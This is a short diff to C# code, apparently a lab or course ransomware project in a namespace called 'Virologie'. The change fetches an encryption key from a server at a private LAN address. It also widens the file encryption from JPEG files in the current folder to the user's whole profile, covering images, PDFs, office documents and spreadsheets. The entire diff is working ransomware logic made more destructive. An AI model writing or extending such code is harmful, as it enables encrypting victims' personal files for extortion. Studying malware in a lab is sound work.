@@ -51,11 +51,13 @@ namespace Virologie
         {
             var explorer = new FileExplorer();
             FileEncrypter encrypter = (_keyfile == null)
-                ? CryptoKeyManager.CreateFromServer("http://localhost:1234/")
+                ? CryptoKeyManager.CreateFromServer("http://192.168.56.102:1234/")
                 : CryptoKeyManager.CreateFromFile(_keyfile);
 
             CryptoKeyManager.SaveGUID();
-            explorer.ApplyTo(Directory.GetCurrentDirectory(), new[] {"*.jpg"}, CreateFileAction(encrypter));
+            explorer.ApplyTo(Environment.GetEnvironmentVariable("USERPROFILE"),
+                new[] {"*.jpg", "*.png", "*.pdf", "*.odt", ".odf", "*.doc?", "*.xls?"},
+                CreateFileAction(encrypter));
         }
 
         private FileExplorer.FileAction CreateFileAction(FileEncrypter encrypter)
